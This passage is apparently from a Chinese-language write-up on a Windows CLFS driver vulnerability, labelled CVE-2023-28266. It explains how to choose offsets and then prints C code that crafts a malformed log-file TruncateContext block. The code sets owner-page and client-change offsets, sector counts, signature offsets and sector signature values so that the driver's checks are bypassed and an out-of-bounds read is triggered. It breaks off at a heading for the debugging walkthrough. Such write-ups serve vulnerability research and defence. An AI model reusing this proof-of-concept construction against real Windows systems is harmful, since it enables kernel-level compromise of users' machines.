
`chk2 = offOwnerPage == offClientChange` 和 `chk2` 这 2 个条件都不能让它成立。参数 `offset` 位于整个元数据块长度减去 `0x30` 字节处。为了让 `offset - offOwnerPage < 0x1000` 且 `offset - offClientChange < 0x230` 不成立，只能让 `offOwnerPage - offClientChange >= 0x230` 成立。

得出结论：`offset` 减去 `offOwnerPage` 和 `offClientChange` 都只能大于 `0x1000`，而且它们的差值需要大于 `0x230`。那么，`offClientChange` 就必须小于 `offset - 0x1000 - 0x230` 的值，采用 `0x1750 - 0x238 = 1518` 可以是个合适的值。

在第二步校验中，`0x208 * chg_cLength > offOwnerPage`，所以 `offOwnerPage` 必须大于 `0x208 * 9 = 1248`，采用 `0x1750` 也符合要求。

为什么采用 `TruncateContext` 元数据块大小 `0x2800`？原因是：`offClientChange = 1518`，`0x2800 - 1518 - 70 = 1278`，转换成扇区个数 `1278 / 208 = 9`，正好是 9 个。通过加减 8 个字节的微调，让这些符号的边界都和扇区对齐，让最后一个 `PCLFS_SECTOR_CHANGE` 扇区的边界（`9 * 0x208 = 1248`）正好落在整个 `TruncateContext` 元数据块的结尾，`1248 + 70 + 1518 + sizeof(CLFS_TRUNCATE_CLIENT_CHANGE) = 27f8`（约等于 `2800`）。

而越界读取没有对 `PCLFS_TRUNCATE_CLIENT_CHANGE->cLength` 进行校验，导致读取数据越过了元数据块的边界。这里，`SignaturesOffset` 需要被 `clfs` 写入签名值，所以必须让它落在拷贝扇区数据的内存区域，否则会污染符号表的数据。在 `ClfsDecodeBlockPrivate` 中，对这个值和 `CLFS_LOG_BLOCK_HEADER->TotalSectorCount` 的组合也有校验需要绕过，笔者使用的合适 `SignaturesOffset` 值是元数据块大小 `TruncateContextlength - 0x30`。

完整的绕过方法，构造合适的值如下：

```c
int TruncateContextlength = 0x2800;
hd->SignaturesOffset = TruncateContextlength - 0x30;
ULONGLONG trunc_record_ptr = (ULONGLONG)hd + hd->RecordOffsets[0];
PCLFS_TRUNCATE_RECORD_HEADER trunhdr = (PCLFS_TRUNCATE_RECORD_HEADER)trunc_record_ptr;
//size=10
ULONG idx = 0xa;
trunhdr->coffOwnerPage = 0x1750;
//0x1750- 0x238=1518+70=1588
trunhdr->coffClientChange = 0x1750 - 0x238;
PCLFS_TRUNCATE_CLIENT_CHANGE trunchg = (PCLFS_TRUNCATE_CLIENT_CHANGE)(trunc_record_ptr + trunhdr->coffClientChange);
trunchg->cSectors = idx;
trunchg->cLength = idx;
trunchg->cOldLength = 0x20;
trunchg->cidClient = 0;
//1588+28+*(208*9)
for (int i = 0; i < idx; i++)
{
    trunchg->rgSectors[i].iSector = i;
}
PCLFS_LOG_BLOCK_HEADER hdr = (PCLFS_LOG_BLOCK_HEADER)(&trunchg->rgSectors[0].rgbSector[0]);
memcpy(hdr, hd, 0x200);
hdr->TotalSectorCount = idx;
hdr->ValidSectorCount = idx;
hdr->Flags = 0;
hdr->SignaturesOffset = (idx << 9) - 0x20;
*(USHORT*)((ULONGLONG)hd + 0x200 - 2) = 0x0150;
for (int i = 0x400; i < TruncateContextlength; i += 0x200)
{
    *(USHORT*)((ULONGLONG)hd + i - 2) = 0x0110;
}
*(USHORT*)((ULONGLONG)hd + TruncateContextlength - 2) = 0x0130;
return (BYTE*)trunchg;
```

## CVE-2023-28266 调试过程

下面我们来看调试过程。
